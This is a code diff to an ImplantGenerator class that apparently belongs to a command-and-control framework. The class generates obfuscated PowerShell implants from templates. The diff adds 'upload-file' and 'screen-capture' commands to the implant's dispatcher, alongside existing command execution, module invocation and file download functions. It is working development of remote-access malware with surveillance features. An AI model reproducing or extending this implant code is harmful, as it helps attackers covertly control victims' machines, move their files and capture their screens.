@@ -5,6 +5,7 @@ import random
 from Implant.PSObfucate import PSObfucate
 from Implant.ImplantFunctionality import ImplantFunctionality
 
+
 class ImplantGenerator:
     # ImplantGenerator has a single public method (generate_implant_from_template)
     #   which is used to generate a new active implant in the event of a stager
@@ -31,9 +32,9 @@ class ImplantGenerator:
         "obf_invoke_module": "invoke-module",
         "obf_get_loaded_modules": "get-loaded-modules",
         "obf_upload_file": "upload-file",
-        "obf_download_file": "download-file"
+        "obf_download_file": "download-file",
+        "obf_screen_capture": "screen-capture"
         }
-
 
     execute_command = '''
 function {{ ron.obf_builtin_command }}($data){
@@ -63,6 +64,10 @@ function {{ ron.obf_builtin_command }}($data){
         {{ ron.obf_get_loaded_modules }}  
     } elseif ($a -eq "FD"){
         {{ ron.obf_download_file }}($b)
+    } elseif ($a -eq "UF"){
+        {{ ron.obf_upload_file }}($b)
+    } elseif ($a -eq "SC"){
+        {{ ron.obf_screen_capture }}($b)
     } else {
         $Script:tr = "0"
     }
@@ -174,7 +179,6 @@ while($true){
         implant_functions = self.ImpFunc.get_list_of_implant_text()
         implant_functions.extend(core_implant_functions)
 
-
         # Checks which protocols should be embedded into the implant.
         if implant_data['comms_http'] is not None:
             implant_functions.append(self.http_function)
@@ -237,4 +241,5 @@ while($true){
             obfuscation_level=implant_data['obfuscation_level'],
             obf_variables=variable_list
         )
+
         return output_from_parsed_template
